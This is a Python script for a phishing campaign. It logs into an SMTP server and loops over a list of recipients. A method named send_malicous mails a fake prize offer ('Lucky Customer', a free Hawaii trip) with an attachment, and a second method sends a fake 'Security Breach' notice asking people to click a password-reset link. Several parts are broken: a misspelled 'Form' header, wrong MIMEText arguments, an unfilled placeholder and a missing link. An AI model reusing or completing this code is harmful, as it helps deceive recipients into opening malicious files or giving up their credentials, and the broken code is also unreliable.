import smtplib
from email.mime import multipart as mp, text, base
from email import encoders
import config as cf

class Email_Generator():
    def __init__(self):
        try:
            self.server = smtplib.SMTP('mydns.com', 587)
            self.server.ehlo()
            self.server.starttls()
            self.server.login(cf.EMAIL_ADDRESS, cf.PASSWORD)
            print('Connection established\n')
        except Exception as e:
            print('Fail to connect to server\n')
            print(e)

    def send_malicous(self):
        try:
            for receiver in cf.RECEIVER_LIST:
                sender = cf.EMAIL_ADDRESS
                message = mp.MIMEMultipart('alternative')
                message['Subject'] = 'Lucky Customer'
                message['Form'] = sender
                message['To'] = receiver
                body = """
                                    Dear Customer,

                                    We sincerely thank you for choosing our service.

                                    As our appreciation to you, we would like give you a free travel ticket to Hawaii for two weeks.

                                    Details are enclosed in the attachment.

                                    For more information, please contact us via 0406783490.                    
                                    """

                filename = cf.FILE
                with open(filename, 'r') as f:
                    part = base.MIMEBase("application", "pdf")
                    part.set_payload(f.read())

                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    'attachment', filename=filename)
                message.attach(body)
                message.attach(part)
                self.server.sendmail(sender, receiver, message.as_string())
                print('Sent to {}\n'.format(receiver))
        except Exception as e:
            print('Sent failed\n')
            print(e)

    def send_URL(self):
        try:
            for receiver in cf.RECEIVER_LIST:
                sender = cf.EMAIL_ADDRESS
                message = mp.MIMEMultipart('alternative')
                message['Subject'] = 'Security Breach'
                message['Form'] = sender
                message['To'] = receiver
                content = """
                        We have been informed that your account has unauthenticated access at {}.
                        
                        Your account, therefore, has been logged out from all devices.
                        
                        Click on this link to reset your password.
                        
                        
                        """
                content = text.MIMEText(text, content)
                message.attach(content)
                self.server.sendmail(sender, receiver, message.as_string())
                print('Sent to {}\n'.format(receiver))
        except Exception as e:
            print('Sent failed\n')
            print(e)
